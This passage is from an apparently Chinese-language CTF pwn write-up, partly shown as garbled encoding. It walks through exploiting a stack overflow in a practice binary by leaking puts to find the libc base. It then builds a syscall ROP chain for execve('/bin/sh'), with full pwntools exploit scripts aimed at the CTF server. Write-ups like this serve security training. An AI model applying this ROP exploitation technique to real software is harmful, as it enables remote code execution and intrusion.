></p>
<p>64ä½åŠå¼€RELROã€å…³é—­canaryã€PIEä¿æŠ¤ã€å…¨å¼€NXä¿æŠ¤ã€‚</p>
<p>IDA64ä½åˆ†æï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/36.png"
	width="846"
	height="215"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/36_hu_c4f0c4dd19585586.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/36_hu_e7f7e525799f872c.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="393"
		data-flex-basis="944px"
	
></p>
<p>æœ‰æ ˆæº¢å‡ºæ¼æ´ï¼Œå¡«å……0x30+8ï¼Œç»™äº†æç¤ºè¯´æ²¡æœ‰systemå‡½æ•°ï¼Œè¿˜éœ€è¦æˆ‘ä»¬æ³„éœ²åŸºåœ°å€ï¼Œæ„é€ ROPã€‚</p>
<p>å¤§è‡´æ€è·¯å°±æ˜¯æ³„éœ²putså‡½æ•°çš„åœ°å€ï¼Œç»“åˆlibcçš„åç§»é‡å¾—å‡ºç¨‹åºçš„å‡½æ•°åŸºåœ°å€ï¼Œå†åæ¨å‡ºå…¶ä»–å‡½æ•°åœ¨ç¨‹åºçš„çœŸå®åœ°å€ï¼Œä»è€Œè¿›è¡Œè°ƒç”¨ã€‚</p>
<p>æ³„éœ²putså‡½æ•°åœ°å€ï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/37.png"
	width="1004"
	height="265"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/37_hu_89f64608163eea2f.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/37_hu_b7872375220a86a5.png 1024w"
	loading="lazy"
	
		alt="puts_got:0x0000000000404018"
	
	
		class="gallery-image" 
		data-flex-grow="378"
		data-flex-basis="909px"
	
></p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/38.png"
	width="1095"
	height="229"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/38_hu_a0c31c2b4b3af3de.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/38_hu_880c1b99008a87b3.png 1024w"
	loading="lazy"
	
		alt="puts_plt:0x0000000000401030"
	
	
		class="gallery-image" 
		data-flex-grow="478"
		data-flex-basis="1147px"
	
></p>
<p>putsçš„gotè¡¨å’Œpltè¡¨çš„åœ°å€éƒ½çŸ¥é“äº†ã€‚</p>
<p>payload1ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./main&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">25478</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x0000000000401030</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x0000000000404018</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_offset</span> <span class="o">=</span> <span class="mh">0x1b75aa</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040122b</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³„éœ²å®Œä¹‹åæ¥æ”¶åœ°å€ï¼Œç®—å‡ºåŸºåœ°å€libc_base:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">puts_read_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;/n&#34;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">),</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_real_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">binsh_offset</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘èµ·åˆçš„æ€è·¯æ˜¯æƒ³è°ƒç”¨systemå‡½æ•°çš„ï¼Œä½†ä¸çŸ¥ä¸ºä½•æ ˆä¸€ç›´å¯¹ä¸é½ï¼Œå„ä½å¸ˆå‚…å¯ä»¥å»å¼€å¤´é‚£çœ‹ä¸€ä¸‹æˆ‘çš„expï¼Œé‚£ç°åœ¨æˆ‘åªèƒ½ç”¨syscallå‡½æ•°äº†&hellip;&hellip;ä¹Ÿå°±æ˜¯è°ƒç”¨execveå‡½æ•°ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>ç›´æ¥è°ƒç”¨ <code>syscall</code> å¯¹æ ˆå¯¹é½çš„è¦æ±‚è¿œæ²¡æœ‰ <code>system</code> å‡½æ•°ä¸¥æ ¼ï¼Œæ ¸å¿ƒåŸå› æ˜¯ <strong>ä¸¤è€…çš„æ‰§è¡Œå±‚çº§å’Œä¾èµ–ä¸åŒ</strong>ï¼š<code>system</code> æ˜¯ libc å°è£…çš„å‡½æ•°ï¼Œå†…éƒ¨æœ‰æ ˆå¸§çº¦æŸï¼›è€Œ <code>syscall</code> æ˜¯ç›´æ¥è§¦å‘å†…æ ¸æŒ‡ä»¤ï¼Œå¯¹ç”¨æˆ·æ€æ ˆçš„å¯¹é½è¦æ±‚æä½ã€‚</p>
<p>ç”¨ <code>syscall</code> è§¦å‘ <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>ï¼Œå“ªæ€• ROP é“¾ä¸­æ²¡æœ‰åˆ»æ„åŠ  <code>ret</code> å¯¹é½ï¼Œä¹Ÿèƒ½æ­£å¸¸getshellã€‚</p>
</blockquote></blockquote>
<p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬äº†è§£ä¸€ä¸‹è¿™ä¸ªexecveå‡½æ•°ï¼š<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">rax</span> <span class="mh">0x3b</span>
</span></span><span class="line"><span class="cl"><span class="nf">rdi</span> <span class="s">&#34;/bin/sh&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">rsi</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nf">rdx</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nf">syscall</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£æˆ‘ä»¬å°±éœ€è¦æœ‰è¿™äº›å¯„å­˜å™¨çš„gadgetäº†ã€‚</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/39.png"
	width="1011"
	height="205"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/39_hu_50840a89634a0026.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/39_hu_4f53e57699e6c3aa.png 1024w"
	loading="lazy"
	
		alt="pop_rsi_offset = 0x0000000000027529"
	
	
		class="gallery-image" 
		data-flex-grow="493"
		data-flex-basis="1183px"
	
></p>
<p>åœ¨ç¨‹åºä¸­æ‰¾åˆ°ä¸€ä¸ªæœ‰r15å¯„å­˜å™¨çš„gadgetï¼Œè¿™ä¸åˆæˆ‘ä»¬è¦æ±‚ï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥è¦†ç›–æ‰ï¼Œé¢˜ç›®ç»™äº†libc.so.6æ–‡ä»¶ï¼Œæˆ‘ä»¬åˆæ±‚å‡ºäº†åŸºåœ°å€ï¼Œå¯ä»¥ç”¨libcçš„gadgetåç§»é‡â€”â€”pop rsi ; retï¼Œè¿™æ ·å°±ä¸ç”¨å†å»è¦†ç›–äº†ã€‚</p>
<p>é‚£è¿™ä¸ªæœ‰raxçš„gadgetä¹Ÿæ˜¯è¿™æ ·ï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/40.png"
	width="1023"
	height="148"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/40_hu_2523ba12ed0f7c4d.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/40_hu_d2fc43c429422bdd.png 1024w"
	loading="lazy"
	
		alt="pop_rax_offset = 0x000000000004a550"
	
	
		class="gallery-image" 
		data-flex-grow="691"
		data-flex-basis="1658px"
	
></p>
<p>æ²¡æœ‰å•ç‹¬çš„rdxå•Šï¼Œéšä¾¿æŒ‘ä¸€ä¸ªéƒ½å¯ä»¥ï¼ŒæŠŠç”¨ä¸åˆ°çš„å¯„å­˜å™¨éƒ½è¦†ç›–æ‰å°±å¥½ã€‚</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/41.png"
	width="1001"
	height="149"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/41_hu_2696db11a0514f43.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/41_hu_a5c7cb32fc7a57c8.png 1024w"
	loading="lazy"
	
		alt="pop_rdx_pop_rbx_offset = 0x00000000001626d6"
	
	
		class="gallery-image" 
		data-flex-grow="671"
		data-flex-basis="1612px"
	
></p>
<p>syscallï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/42.png"
	width="994"
	height="174"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/42_hu_48979316ee8aadf7.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/42_hu_2b2fac577451594.png 1024w"
	loading="lazy"
	
		alt="syscall_offset = 0x000000000002584d"
	
	
		class="gallery-image" 
		data-flex-grow="571"
		data-flex-basis="1371px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_rax_offset</span> <span class="o">=</span> <span class="mh">0x000000000004a550</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_offset</span> <span class="o">=</span> <span class="mh">0x0000000000027529</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_pop_rbx_offset</span> <span class="o">=</span> <span class="mh">0x00000000001626d6</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040122b</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall_offset</span> <span class="o">=</span> <span class="mh">0x000000000002584d</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆpayload2ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">binsh_offset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rax_offset</span> <span class="o">=</span> <span class="mh">0x000000000004a550</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_offset</span> <span class="o">=</span> <span class="mh">0x0000000000027529</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_pop_rbx_offset</span> <span class="o">=</span> <span class="mh">0x00000000001626d6</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040122b</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall_offset</span> <span class="o">=</span> <span class="mh">0x000000000002584d</span>
</span></span><span class="line"><span class="cl"><span class="c1">#è¿™å‡ ä¸ªgadgetéƒ½æ˜¯æºè‡ªlibc.so.6ï¼Œéƒ½æ˜¯åç§»é‡ï¼Œéœ€è¦åŠ ä¸Šç¨‹åºåŸºåœ°å€æ‰èƒ½å¾—å‡ºå¯ç”¨çš„çœŸå®åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">syscall_offset</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_offset</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_pop_rbx_offset</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_offset</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0x3bæ˜¯execveå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·â€”â€”execve(&#34;/bin/sh&#34;, 0, 0)</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">rax 0x3b
</span></span></span><span class="line"><span class="cl"><span class="s2">rdi &#34;/bin/sh&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">rsi 0
</span></span></span><span class="line"><span class="cl"><span class="s2">rdx 0
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œlibcä¸­æŸ¥è¯¢å¾—åˆ°çš„å«rdxçš„gadgetå¹¶ä¸æ˜¯å•ç‹¬çš„ï¼Œéœ€è¦å¤šä¸€ä¸ªp64(0)å°†å…¶è¦†ç›–</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(io)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®Œæ•´expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./main&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">24302</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x0000000000401030</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x0000000000404018</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_offset</span> <span class="o">=</span> <span class="mh">0x1b75aa</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040122b</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">binsh_offset</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rax_offset</span> <span class="o">=</span> <span class="mh">0x000000000004a550</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_offset</span> <span class="o">=</span> <span class="mh">0x0000000000027529</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_pop_rbx_offset</span> <span class="o">=</span> <span class="mh">0x00000000001626d6</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040122b</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall_offset</span> <span class="o">=</span> <span class="mh">0x000000000002584d</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">syscall_offset</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_offset</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_pop_rbx_offset</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_offset</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(io)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="æ€»ç»“">æ€»ç»“
</h2><p>è¿™åé“é¢˜è¯´å®è¯è´¨é‡è¿˜ä¸é”™ï¼Œä½“éªŒæ„Ÿå¾ˆæ£’ã€‚</p>
<p>å®˜ç½‘æœ‰å®˜æ–¹WPï¼Œæˆ‘è¿™åªæ˜¯ä¸ªäººWPï¼Œæœ‰äº›è®¸åŒºåˆ«ï¼Œæ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥ä¸€èµ·åœ¨åœ¨è¯„è®ºåŒºäº¤æµğŸ˜„ï¼</p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-11-07
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/moectf_2025/">
        
